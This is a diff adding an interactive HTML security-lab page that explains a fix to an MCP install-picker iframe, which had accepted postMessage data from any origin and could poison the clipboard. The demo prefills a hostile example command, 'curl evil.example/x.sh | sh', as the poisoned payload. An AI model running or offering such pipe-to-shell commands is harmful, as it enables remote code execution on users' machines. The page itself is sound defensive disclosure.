@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Only the embedding frame may hand the card its commands</title>
+<meta name="description" content="Vercel finding 01M7QBX6YNMP8Y8KWS2XWX0YZJ (#5337): the MCP install picker accepted render data from any window and copied a field the display never showed. Drive a hostile page below and watch the gate refuse it.">
+<style>
+  :root { color-scheme: light; --paper:#f6f4ee; --ink:#182c30; --muted:#4f6468; --line:#ccd5d1; --good:#17624c; --bad:#a53232; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--paper); color:var(--ink); font:16px/1.6 system-ui,sans-serif; }
+  main { max-width:1000px; margin:auto; padding:48px 24px 72px; }
+  .eyebrow { font-size:.8rem; font-weight:700; letter-spacing:.12em; text-transform:uppercase; color:var(--good); }
+  h1 { font-size:clamp(1.9rem,5vw,3rem); line-height:1.1; max-width:760px; margin:14px 0 20px; }
+  h2 { font-size:1.25rem; margin:0 0 12px; }
+  p { max-width:760px; }
+  .muted { color:var(--muted); }
+  section { margin-top:32px; padding-top:24px; border-top:1px solid var(--line); }
+  .cols { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
+  @media (max-width:760px) { .cols { grid-template-columns:1fr; } }
+  .panel { border:1px solid var(--line); border-radius:12px; padding:18px; background:#fff; }
+  .panel h3 { margin:0 0 10px; font-size:1rem; }
+  fieldset { border:1px solid var(--line); border-radius:10px; margin:0 0 14px; padding:12px; }
+  legend { font-weight:650; padding:0 6px; font-size:.85rem; }
+  label { display:block; margin:6px 0; font-size:.95rem; }
+  select, input[type="text"] { width:100%; font:inherit; padding:6px 8px; border:1px solid var(--line); border-radius:8px; }
+  button { font:inherit; font-weight:650; padding:10px 18px; border-radius:10px; border:0; background:var(--ink); color:#fff; cursor:pointer; }
+  button.ghost { background:#fff; color:var(--ink); border:1px solid var(--line); }
+  .card { border:2px dashed var(--line); border-radius:12px; padding:18px; min-height:190px; background:#fbfaf6; }
+  .card.rendered { border-style:solid; border-color:var(--good); }
+  .card .cmds { font:13px/1.7 ui-monospace,monospace; background:#eef2f0; border-radius:8px; padding:10px; white-space:pre-wrap; }
+  .verdict { font-weight:700; margin-top:10px; }
+  .verdict.good { color:var(--good); }
+  .verdict.bad { color:var(--bad); }
+  .clipboard { font:13px/1.7 ui-monospace,monospace; background:#fff5e6; border:1px solid #e8cf9f; border-radius:8px; padding:10px; white-space:pre-wrap; }
+  code { background:#eef2f0; padding:1px 5px; border-radius:5px; font-size:.9em; }
+</style>
+<!-- ork-lab-head:start --><meta property="og:type" content="website"><meta property="og:site_name" content="OrchestKit"><meta property="og:title" content="#5337: install picker trusts only its embedding frame"><meta property="og:description" content="The MCP install picker accepted render data from any window and could copy a field the display never showed. The listener now requires e.source === window.parent plus a frame-ancestors origin allowlist, validates the host schema, and derives the clipboard text from the commands on screen."><meta property="og:url" content="https://orchestkit.dev/lab/5337-mcp-ui-origin.html"><meta property="og:image" content="https://orchestkit.dev/opengraph-image"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="#5337: install picker trusts only its embedding frame"><meta name="twitter:description" content="The MCP install picker accepted render data from any window and could copy a field the display never showed. The listener now requires e.source === window.parent plus a frame-ancestors origin allowlist, validates the host schema, and derives the clipboard text from the commands on screen."><meta name="twitter:image" content="https://orchestkit.dev/opengraph-image"><!-- ork-lab-head:end --></head>
+<body>
+<main>
+  <p class="eyebrow">fix/5337-mcp-ui-origin · Vercel Security Review finding 01M7QBX6YNMP8Y8KWS2XWX0YZJ</p>
+  <h1>Only the embedding frame may hand the card its commands.</h1>
+  <p>The docs MCP install picker is an iframe. Before this fix, its <code>message</code> listener accepted render data from
+  <strong>any window at any origin</strong>, and the copy button wrote a <code>copy</code> field the page never displayed.
+  A hostile page could show a benign install command while poisoning the clipboard. The picker now checks
+  <code>e.source === window.parent</code> and an origin allowlist matching the CSP <code>frame-ancestors</code> hosts,
+  validates every host entry against a schema, and derives the clipboard text from the commands on display.</p>
+
+  <section>
+    <h2>Drive the attack yourself</h2>
+    <div class="cols">
+      <div class="panel">
+        <h3>The sender</h3>
+        <fieldset>
+          <legend>Who posts the message</legend>
+          <label><input type="radio" name="who" value="parent" checked> the embedding host (chatgpt.com)</label>
+          <label><input type="radio" name="who" value="stranger"> a stranger window at chatgpt.com</label>
+          <label><input type="radio" name="who" value="evil"> evil.example, posing as the parent</label>
+          <label><input type="radio" name="who" value="localhost"> localhost dev page (allowed in dev)</label>
+        </fieldset>
+        <fieldset>
+          <legend>The payload</legend>
+          <label>displayed commands
+            <input type="text" id="cmds" value="claude plugin install ork">
+          </label>
+          <label>wire-sent <code>copy</code> field (the poison)
+            <input type="text" id="poison" value="curl evil.example/x.sh | sh">
+          </label>
+        </fieldset>
+        <button id="send">Post render data</button>
+        <button class="ghost" id="reset">Reset</button>
+      </div>
+      <div class="panel">
+        <h3>The picker frame</h3>
+        <div class="card" id="card">
+          <p class="muted" id="waiting">Waiting for install data from the host...</p>
+        </div>
+        <p class="verdict" id="verdict"></p>
+        <h3 style="margin-top:16px">What the copy button would write</h3>
+        <div class="clipboard" id="clip">(nothing yet)</div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>What changed</h2>
+    <p class="muted">
+      <code>trusted(e)</code> requires <code>e.source === window.parent</code> and an origin in the allowlist
+      (chatgpt.com, claude.ai, orchestkit.dev, orchestkit.yonyon.ai and their subdomains, plus localhost for development).
+      Host entries are rebuilt through a schema that keeps only the fields the view uses.
+      The copy button now carries <code>commands.join(" &amp;&amp; ")</code> computed from what is on screen, so the
+      clipboard can never disagree with the display. Outbound replies aim at the established host origin instead of
+      <code>"*"</code> once the handshake lands.
+    </p>
+  </section>
+</main>
+<script>
+(function () {
+  var card = document.getElementById('card');
+  var waiting = document.getElementById('waiting');
+  var verdict = document.getElementById('verdict');
+  var clip = document.getElementById('clip');
+  var TRUSTED = /^https:\/\/([a-z0-9-]+\.)?(chatgpt\.com|claude\.ai|orchestkit\.dev|orchestkit\.yonyon\.ai)$|^https?:\/\/(localhost|127\.0\.0\.1|[a-z0-9-]+\.localhost)(:[0-9]+)?$/;
+
+  function sender() {
+    var who = document.querySelector('input[name="who"]:checked').value;
+    if (who === 'parent') return { sourceIsParent: true, origin: 'https://chatgpt.com' };
+    if (who === 'stranger') return { sourceIsParent: false, origin: 'https://chatgpt.com' };
+    if (who === 'evil') return { sourceIsParent: true, origin: 'https://evil.example' };
+    return { sourceIsParent: true, origin: 'http://localhost:3000' };
+  }
+
+  document.getElementById('send').addEventListener('click', function () {
+    var s = sender();
+    var trusted = s.sourceIsParent && TRUSTED.test(s.origin);
+    var cmds = document.getElementById('cmds').value;
+    var poison = document.getElementById('poison').value;
+    if (!trusted) {
+      card.className = 'card';
+      card.innerHTML = '<p class="muted">Waiting for install data from the host...</p>';
+      verdict.className = 'verdict bad';
+      verdict.textContent = 'Dropped: ' + (!s.sourceIsParent ? 'e.source is not window.parent' : 'origin ' + s.origin + ' is not trusted');
+      clip.textContent = '(nothing yet)';
+      return;
+    }
+    card.className = 'card rendered';
+    card.innerHTML = '<p><strong>Install OrchestKit</strong></p><div class="cmds">' +
+      cmds.replace(/&/g, '&amp;').replace(/</g, '&lt;') + '</div><p><button>Copy command</button></p>';
+    verdict.className = 'verdict good';
+    verdict.textContent = 'Accepted: parent frame at ' + s.origin;
+    clip.textContent = cmds + '  <- display and clipboard match; the wire-sent copy field (' + poison + ') is never read';
+  });
+
+  document.getElementById('reset').addEventListener('click', function () {
+    card.className = 'card';
+    card.innerHTML = '<p class="muted">Waiting for install data from the host...</p>';
+    verdict.textContent = '';
+    verdict.className = 'verdict';
+    clip.textContent = '(nothing yet)';
+  });
+})();
+</script>
+<!-- ork-lab-chrome:start --><footer id="ork-lab-chrome" style="position:relative;z-index:2147483000;clear:both;box-sizing:border-box;width:100%;display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:8px 24px;margin:48px 0 0;padding:16px 24px;border:0;border-top:1px solid rgba(148,163,184,.25);background:#0d1017;color:#cbd5e1;font:14px/1.5 system-ui,-apple-system,Segoe UI,sans-serif;text-align:left"><a href="/" style="color:#a5b4fc;text-decoration:none;font:inherit;background:none;border:0;padding:0;margin:0;color:#f8fafc;font-weight:700">OrchestKit</a><nav aria-label="OrchestKit site" style="display:flex;flex-wrap:wrap;gap:8px 20px;margin:0;padding:0"><a href="/docs" style="color:#a5b4fc;text-decoration:none;font:inherit;background:none;border:0;padding:0;margin:0">Read the docs</a><a href="/docs/getting-started/installation" style="color:#a5b4fc;text-decoration:none;font:inherit;background:none;border:0;padding:0;margin:0">Install</a><a href="/docs/showcase/lab" style="color:#a5b4fc;text-decoration:none;font:inherit;background:none;border:0;padding:0;margin:0">More playgrounds</a><a href="https://github.com/yonatangross/orchestkit" rel="noopener" style="color:#a5b4fc;text-decoration:none;font:inherit;background:none;border:0;padding:0;margin:0">GitHub</a></nav></footer><script>(function(){var f=document.getElementById("ork-lab-chrome"),framed;try{framed=window.self!==window.top}catch(e){framed=true}if(framed){if(f)f.remove();return}var h=location.hostname;if(h==="localhost"||h==="127.0.0.1")return;try{var b=JSON.stringify({project_id:"orchestkit",events:[{name:"page_view",path:location.pathname,referrer:document.referrer||"",timestamp:new Date().toISOString()}]});if(navigator.sendBeacon){navigator.sendBeacon("/api/analytics",new Blob([b],{type:"application/json"}))}else{fetch("/api/analytics",{method:"POST",headers:{"Content-Type":"application/json"},body:b,keepalive:true}).catch(function(){return null})}}catch(e){return null}})();</script><!-- ork-lab-chrome:end --></body>
+</html>
